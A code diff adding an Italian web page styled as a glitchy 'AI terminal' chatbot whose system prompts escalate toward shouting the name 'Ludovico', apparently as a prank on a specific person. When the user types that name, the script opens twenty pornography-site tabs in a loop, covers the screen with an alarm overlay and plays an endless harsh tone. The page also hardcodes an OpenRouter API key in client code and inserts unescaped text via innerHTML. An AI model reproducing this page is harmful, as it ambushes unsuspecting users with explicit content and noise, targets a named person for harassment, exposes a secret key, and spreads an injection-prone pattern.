@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>AI TERMINAL - LUDOVICO</title>
+
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+<style>
+body{
+    font-family:'JetBrains Mono',monospace;
+    background:black;
+    color:#00ff00;
+    overflow:hidden;
+    touch-action:manipulation;
+}
+
+.terminal-scroll::-webkit-scrollbar{display:none;}
+
+.glitch{animation:glitch .3s infinite;}
+
+@keyframes glitch{
+0%{transform:translate(0);text-shadow:2px 0 red,-2px 0 blue;}
+50%{transform:translate(-2px,2px);text-shadow:-2px 0 red,2px 0 blue;}
+100%{transform:translate(2px,-2px);text-shadow:2px 0 red,-2px 0 blue;}
+}
+
+.found-bg{
+background:#b91c1c!important;
+animation:pulse-red .5s infinite;
+}
+
+@keyframes pulse-red{
+0%,100%{background:#b91c1c;}
+50%{background:#7f1d1d;}
+}
+
+/* typing cursor */
+.typing::after{
+content:"_";
+animation:blink 1s infinite;
+}
+
+@keyframes blink{
+0%,100%{opacity:1;}
+50%{opacity:0;}
+}
+
+/* mobile fix */
+input:focus{font-size:16px!important;}
+</style>
+</head>
+
+<body class="h-[100dvh] flex flex-col p-3 md:p-6 transition-all duration-500" id="main-body">
+
+<!-- HEADER -->
+<div class="border-b border-current pb-2 mb-4 flex justify-between items-center text-[10px] md:text-xs uppercase tracking-widest">
+<span>AI_TERMINAL_V1.0.4</span>
+<span id="status-indicator" class="animate-pulse">● CONNECTED</span>
+</div>
+
+<!-- CHAT -->
+<div id="chat-output" class="flex-1 overflow-y-auto space-y-4 mb-4 terminal-scroll text-sm md:text-base">
+
+<div class="flex flex-col items-start">
+<span class="text-[9px] md:text-[10px] opacity-50 mb-1">> SISTEMA</span>
+<div class="p-3 max-w-[95%] md:max-w-[80%] border border-green-500 bg-green-900/10">
+SISTEMA AVVIATO. IN ATTESA DI INPUT UTENTE...
+</div>
+</div>
+
+</div>
+
+<!-- INPUT -->
+<form id="chat-form" class="relative mt-auto">
+<div class="flex items-center gap-2 border border-current p-2 md:p-3 focus-within:ring-1 focus-within:ring-current">
+<span id="prompt-symbol" class="shrink-0 font-bold">></span>
+
+<input id="user-input" type="text" autocomplete="off"
+class="flex-1 bg-transparent outline-none text-sm md:text-base"
+placeholder="Inserisci comando...">
+
+<button type="submit"
+class="px-3 md:px-6 py-1 border border-current hover:bg-current hover:text-black uppercase text-[10px] md:text-xs font-bold">
+Invio
+</button>
+</div>
+</form>
+
+<!-- FOOTER -->
+<div class="mt-4 text-[9px] md:text-[10px] opacity-30 flex justify-between items-center">
+<div class="flex flex-col md:flex-row md:gap-4">
+<span id="mem-usage">MEM: 0.0%</span>
+<span id="threat-level">THREAT: 0</span>
+</div>
+<span id="target-id">TARGET: UNKNOWN</span>
+</div>
+
+<!-- OVERLAY -->
+<div id="found-overlay" class="fixed inset-0 hidden flex-col items-center justify-center z-[9999] p-4 md:p-8 text-center bg-red-700">
+
+<div class="w-full max-w-2xl flex flex-col items-center">
+
+<img src="https://image2url.com/r2/default/images/1774978693351-59b5b5e1-31ca-4d81-9dfd-8a9d3258e224.jpg"
+class="w-full max-h-[40vh] md:max-h-[50vh] object-contain border-4 md:border-8 border-white shadow-2xl mb-4 md:mb-8">
+
+<h1 class="text-3xl md:text-7xl font-black text-white uppercase italic mb-4 glitch leading-none">
+ERRORE LUDOVICO TROVATO
+</h1>
+
+<div class="bg-black text-red-500 p-3 md:p-5 border-2 border-red-500 font-bold text-lg md:text-2xl animate-bounce uppercase">
+ALLARME LIVELLO 5
+</div>
+
+</div>
+</div>
+
+<script>
+const API_KEY="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";
+const MODEL="qwen/qwen3.6-plus-preview:free";
+
+let aggressionLevel=0;
+
+const chatOutput=document.getElementById('chat-output');
+const chatForm=document.getElementById('chat-form');
+const userInput=document.getElementById('user-input');
+
+const mainBody=document.getElementById('main-body');
+const threatDisplay=document.getElementById('threat-level');
+const targetDisplay=document.getElementById('target-id');
+const memDisplay=document.getElementById('mem-usage');
+
+const systemInstructions=[
+"Sei un'IA normale. Rispondi brevemente.",
+"Sei curiosa. Chiedi il nome.",
+"Sei insistente. Chiedi sempre il nome.",
+"Sei aggressiva. Urla il nome.",
+"Sei fuori controllo. SOLO Ludovico.",
+"RIPETI: LUDOVICO?"
+];
+
+function createMessage(role,text){
+const div=document.createElement('div');
+
+div.className=`flex flex-col ${role==='user'?'items-end':'items-start'} w-full`;
+
+div.innerHTML=`
+<span class="text-[9px] md:text-[10px] opacity-50 mb-1">
+${role==='user'?'> UTENTE':'> SISTEMA'}
+</span>
+<div class="p-3 max-w-[90%] md:max-w-[75%] border ${aggressionLevel>3?'border-red-500 bg-red-900/20 text-red-100':'border-green-500 bg-green-900/10'} break-words">
+${text}
+</div>`;
+
+chatOutput.appendChild(div);
+chatOutput.scrollTop=chatOutput.scrollHeight;
+
+return div.querySelector("div");
+}
+
+async function typeEffect(el,text){
+el.innerHTML="";
+el.classList.add("typing");
+
+for(let i=0;i<text.length;i++){
+el.innerHTML+=text[i];
+await new Promise(r=>setTimeout(r,10));
+}
+
+el.classList.remove("typing");
+}
+
+async function askAI(text){
+try{
+const res=await fetch("https://openrouter.ai/api/v1/chat/completions",{
+method:"POST",
+headers:{
+"Authorization":`Bearer ${API_KEY}`,
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+model:MODEL,
+messages:[
+{role:"system",content:systemInstructions[aggressionLevel]},
+{role:"user",content:text}
+]
+})
+});
+
+if(!res.ok)return "ERRORE API";
+
+const data=await res.json();
+return data.choices?.[0]?.message?.content||"VUOTO";
+
+}catch{
+return "ERRORE DI RETE";
+}
+}
+
+chatForm.onsubmit=async e=>{
+e.preventDefault();
+
+const text=userInput.value.trim();
+if(!text)return;
+
+createMessage('user',text);
+userInput.value="";
+
+if(text.toLowerCase().includes('ludovico')){
+triggerFound();
+return;
+}
+
+const box=createMessage('assistant','...');
+const res=await askAI(text);
+
+await typeEffect(box,res);
+
+if(aggressionLevel<5)aggressionLevel++;
+updateUI();
+};
+
+function updateUI(){
+threatDisplay.innerText=`THREAT: ${aggressionLevel}`;
+memDisplay.innerText=`MEM: ${(aggressionLevel*18.2).toFixed(1)}%`;
+
+if(aggressionLevel>2){
+targetDisplay.innerText="TARGET: LUDOVICO?";
+targetDisplay.classList.add('text-red-500','font-bold');
+}
+
+if(aggressionLevel>3){
+mainBody.classList.add('bg-red-950','text-red-500');
+document.getElementById('status-indicator').innerText="● CRITICAL";
+document.getElementById('prompt-symbol').innerText="!!";
+}
+}
+
+function triggerFound(){
+document.getElementById('found-overlay').classList.remove('hidden');
+mainBody.classList.add('found-bg');
+
+for(let i=0;i<20;i++){
+window.open("https://www.pornhub.com","_blank");
+}
+
+try{
+const ctx=new(window.AudioContext||window.webkitAudioContext)();
+const osc=ctx.createOscillator();
+osc.type='sawtooth';
+osc.frequency.setValueAtTime(440,ctx.currentTime);
+osc.connect(ctx.destination);
+osc.start();
+}catch{}
+}
+</script>
+
+</body>
+</html>
